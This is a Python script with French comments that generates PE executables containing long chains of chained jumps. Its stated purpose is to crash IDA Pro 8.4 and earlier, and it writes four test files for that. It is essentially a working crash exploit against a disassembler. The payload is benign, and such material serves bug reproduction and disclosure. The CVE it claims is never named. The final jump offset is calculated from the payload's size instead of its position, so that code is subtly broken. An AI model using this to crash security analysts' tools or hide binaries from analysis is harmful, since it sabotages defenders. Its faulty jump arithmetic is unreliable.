#!/usr/bin/env python3
"""
Générateur de PE pour reproduire le bug IDA Pro CVE (ida64.dll crash)
Crée un exécutable avec de nombreux sauts chaînés menant au vrai entry point
"""

import struct
import os


def create_dos_header():
    """Crée un en-tête DOS minimal"""
    dos_header = bytearray(64)
    # MZ signature
    dos_header[0:2] = b'MZ'
    # e_lfanew (offset vers PE header) à 0x80
    struct.pack_into('<I', dos_header, 0x3C, 0x80)
    return dos_header


def create_pe_header():
    """Crée l'en-tête PE"""
    pe_sig = b'PE\x00\x00'

    # COFF Header
    machine = struct.pack('<H', 0x8664)  # AMD64
    num_sections = struct.pack('<H', 1)
    timestamp = struct.pack('<I', 0)
    symbol_table = struct.pack('<I', 0)
    num_symbols = struct.pack('<I', 0)
    optional_header_size = struct.pack('<H', 240)  # Size of optional header
    characteristics = struct.pack('<H', 0x0022)  # EXECUTABLE_IMAGE | LARGE_ADDRESS_AWARE

    coff_header = machine + num_sections + timestamp + symbol_table + num_symbols + optional_header_size + characteristics

    return pe_sig + coff_header


def create_optional_header(code_size, entry_point_rva):
    """Crée l'en-tête optionnel PE32+"""
    magic = struct.pack('<H', 0x020B)  # PE32+
    linker_version = struct.pack('<BB', 14, 0)
    size_of_code = struct.pack('<I', code_size)
    size_of_init_data = struct.pack('<I', 0)
    size_of_uninit_data = struct.pack('<I', 0)
    entry_point = struct.pack('<I', entry_point_rva)
    base_of_code = struct.pack('<I', 0x1000)

    image_base = struct.pack('<Q', 0x140000000)
    section_align = struct.pack('<I', 0x1000)
    file_align = struct.pack('<I', 0x200)
    os_version = struct.pack('<HH', 6, 0)
    image_version = struct.pack('<HH', 0, 0)
    subsys_version = struct.pack('<HH', 6, 0)
    win32_version = struct.pack('<I', 0)

    size_of_image = struct.pack('<I', 0x3000)
    size_of_headers = struct.pack('<I', 0x400)
    checksum = struct.pack('<I', 0)
    subsystem = struct.pack('<H', 3)  # CONSOLE
    dll_characteristics = struct.pack('<H', 0x8160)

    stack_reserve = struct.pack('<Q', 0x100000)
    stack_commit = struct.pack('<Q', 0x1000)
    heap_reserve = struct.pack('<Q', 0x100000)
    heap_commit = struct.pack('<Q', 0x1000)
    loader_flags = struct.pack('<I', 0)
    num_rva_sizes = struct.pack('<I', 16)

    # Data directories (16 entries, 8 bytes each)
    data_dirs = b'\x00' * (16 * 8)

    optional_header = (magic + linker_version + size_of_code + size_of_init_data +
                       size_of_uninit_data + entry_point + base_of_code + image_base +
                       section_align + file_align + os_version + image_version +
                       subsys_version + win32_version + size_of_image + size_of_headers +
                       checksum + subsystem + dll_characteristics + stack_reserve +
                       stack_commit + heap_reserve + heap_commit + loader_flags +
                       num_rva_sizes + data_dirs)

    return optional_header


def create_section_header(name, virtual_size, virtual_address, raw_size, raw_offset):
    """Crée un en-tête de section"""
    section_name = name.ljust(8, '\x00').encode()[:8]
    virt_size = struct.pack('<I', virtual_size)
    virt_addr = struct.pack('<I', virtual_address)
    raw_data_size = struct.pack('<I', raw_size)
    raw_data_offset = struct.pack('<I', raw_offset)
    relocs_offset = struct.pack('<I', 0)
    line_nums_offset = struct.pack('<I', 0)
    num_relocs = struct.pack('<H', 0)
    num_line_nums = struct.pack('<H', 0)
    characteristics = struct.pack('<I', 0x60000020)  # CODE | EXECUTE | READ

    return (section_name + virt_size + virt_addr + raw_data_size + raw_data_offset +
            relocs_offset + line_nums_offset + num_relocs + num_line_nums + characteristics)


def generate_jump_chain(num_jumps, payload_offset):
    """
    Génère une chaîne de sauts (la partie qui cause le crash IDA)
    Chaque saut est un JMP relatif court (2 bytes: EB offset)
    """
    code = bytearray()

    # Générer num_jumps sauts
    for i in range(num_jumps):
        # JMP relatif court: EB offset
        # Offset = 0 (sauter à l'instruction suivante)
        code.extend(b'\xEB\x00')

    # Dernier saut vers le payload
    # Calculer l'offset relatif vers le payload
    offset = payload_offset - len(code) - 2

    if -128 <= offset <= 127:
        # JMP court
        code.extend(b'\xEB' + struct.pack('b', offset))
    else:
        # JMP long: E9 offset (4 bytes)
        code.extend(b'\xE9' + struct.pack('<i', offset - 3))

    return bytes(code)


def generate_payload():
    """Génère le vrai code (payload)"""
    # Code simple qui retourne
    payload = bytearray()

    # mov eax, 0
    payload.extend(b'\xB8\x00\x00\x00\x00')

    # ret
    payload.extend(b'\xC3')

    # Padding
    payload.extend(b'\x90' * 100)  # NOPs

    return bytes(payload)


def create_pe_with_jump_chain(output_file, num_jumps=100):
    """Crée le fichier PE complet"""
    print(f"[+] Génération de {output_file} avec {num_jumps} sauts...")

    # Génerer le payload d'abord pour connaître sa taille
    payload = generate_payload()

    # Générer la chaîne de sauts
    jump_chain = generate_jump_chain(num_jumps, len(generate_jump_chain(num_jumps, 0)) + len(payload))

    # Recalculer avec la vraie taille
    jump_chain = generate_jump_chain(num_jumps, len(payload))

    # Code complet
    code = jump_chain + payload

    # Aligner sur 512 bytes (file alignment)
    code_size_aligned = ((len(code) + 0x1FF) // 0x200) * 0x200
    code += b'\x00' * (code_size_aligned - len(code))

    # Créer les en-têtes
    dos_header = create_dos_header()
    dos_stub = b'\x0E\x1F\xBA\x0E\x00\xB4\x09\xCD\x21\xB8\x01\x4C\xCD\x21'
    dos_stub += b'This program cannot be run in DOS mode.\r\r\n$'
    dos_stub = dos_stub.ljust(0x80 - len(dos_header), b'\x00')

    pe_header = create_pe_header()
    optional_header = create_optional_header(len(code), 0x1000)
    section_header = create_section_header('.text', len(code), 0x1000, code_size_aligned, 0x400)

    # Assembler le fichier
    headers = dos_header + dos_stub + pe_header + optional_header + section_header
    headers_size_aligned = 0x400
    headers += b'\x00' * (headers_size_aligned - len(headers))

    # Écrire le fichier
    with open(output_file, 'wb') as f:
        f.write(headers)
        f.write(code)

    print(f"[+] Fichier créé: {output_file}")
    print(f"[+] Taille: {len(headers) + len(code)} bytes")
    print(f"[+] Nombre de sauts: {num_jumps}")
    print(f"[+] Entry point RVA: 0x1000")
    print(f"\n[!] ATTENTION: Ouvrir ce fichier dans IDA Pro 8.4 ou antérieur peut causer un crash!")


if __name__ == '__main__':
    # Créer plusieurs versions avec différents nombres de sauts
    for num_jumps in [50, 100, 200, 500]:
        output_file = f'ida_crash_test_{num_jumps}_jumps.exe'
        create_pe_with_jump_chain(output_file, num_jumps)
        print()

    print("[+] Tous les fichiers de test ont été générés!")
    print("[+] Testez-les dans IDA Pro <= 8.4 pour reproduire le crash.")